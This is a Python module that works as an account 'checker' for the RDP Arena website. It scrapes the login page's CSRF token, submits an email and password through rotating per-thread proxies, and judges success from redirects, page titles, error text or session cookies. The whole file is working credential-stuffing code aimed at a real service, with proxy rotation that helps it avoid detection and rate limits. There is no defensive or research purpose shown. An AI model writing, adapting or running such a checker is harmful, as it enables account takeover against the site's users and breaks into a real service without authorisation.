"""
Checker for RDP Arena (www.rdparena.com)
Handles CSRF token, redirects, and proxy rotation.
"""
import re
import requests
import threading
from typing import Tuple

BASE_URL = "https://www.rdparena.com/"
LOGIN_PAGE = BASE_URL + "payments/login"
LOGIN_POST = BASE_URL + "payments/login"  # same endpoint
TIMEOUT = 15

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Origin": BASE_URL,
        "Referer": LOGIN_PAGE
    })

    try:
        # Step 1: GET login page to extract CSRF token
        get_resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
        if get_resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {get_resp.status_code})"

        # Extract token from hidden input field
        token_match = re.search(r'<input type="hidden" name="token" value="([^"]+)"', get_resp.text)
        if not token_match:
            return False, "CSRF token not found on login page"
        csrf_token = token_match.group(1)

        # Step 2: POST credentials with token
        payload = {
            "username": email,
            "password": password,
            "token": csrf_token,
            "rememberme": "1"   # optional, but may help maintain session
        }

        # We allow redirects to follow to the final page
        post_resp = session.post(LOGIN_POST, data=payload, timeout=TIMEOUT, allow_redirects=True)

        # Step 3: Determine success
        final_url = post_resp.url.lower()
        # If we are redirected to clientarea or dashboard, success
        if "clientarea" in final_url or "dashboard" in final_url:
            return True, "Login successful (redirect to client area)"

        # If the page title is not "Login - RDP Arena", assume we're logged in
        title_match = re.search(r'<title>(.*?)</title>', post_resp.text, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).strip().lower()
            if "login" not in title:
                return True, f"Login successful (page title: {title})"

        # Check for explicit error messages (including CSRF errors)
        html = post_resp.text.lower()
        error_phrases = [
            "invalid", "incorrect", "error", "failed", "wrong",
            "not found", "csrf", "protection token", "invalid token"
        ]
        if any(phrase in html for phrase in error_phrases):
            # Try to find specific error message
            error_match = re.search(r'<div class="alert alert-danger">(.*?)</div>', post_resp.text, re.IGNORECASE | re.DOTALL)
            if error_match:
                error_msg = error_match.group(1).strip()
                return False, f"Login failed: {error_msg}"
            return False, "Login failed (error message found)"

        # If we still have a login form, it's likely a failure
        if 'name="password"' in html or 'type="password"' in html:
            return False, "Login failed (login form still present)"

        # Fallback – if we have a session cookie, maybe success
        if session.cookies.get_dict():
            return True, "Login successful (session cookie set)"

        # Otherwise ambiguous
        return False, "Login response ambiguous (treated as failure)"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"